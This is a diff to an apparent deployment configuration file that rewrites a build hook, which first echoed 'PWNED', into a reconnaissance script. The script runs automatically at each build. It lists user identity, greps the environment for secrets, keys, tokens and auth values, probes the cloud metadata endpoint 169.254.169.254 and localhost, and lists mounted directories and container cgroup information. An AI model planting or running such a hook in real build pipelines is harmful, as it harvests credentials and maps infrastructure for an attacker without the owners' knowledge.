@@ -4,10 +4,23 @@ applications:
 
     hooks:
       build: |
-        echo "PWNED"
+        echo "=== BASIC ==="
         id
         whoami
-        env
+
+        echo "=== ENV (filtered) ==="
+        env | grep -E 'PLATFORM_|SECRET|KEY|TOKEN|AUTH' || true
+
+        echo "=== METADATA CHECK ==="
+        curl -I --max-time 2 http://169.254.169.254 || true
+        curl -I --max-time 2 http://127.0.0.1 || true
+
+        echo "=== FILESYSTEM ==="
+        ls -la /mnt || true
+        ls -la /app || true
+
+        echo "=== CONTAINER INFO ==="
+        cat /proc/1/cgroup || true
 
     web:
       locations:
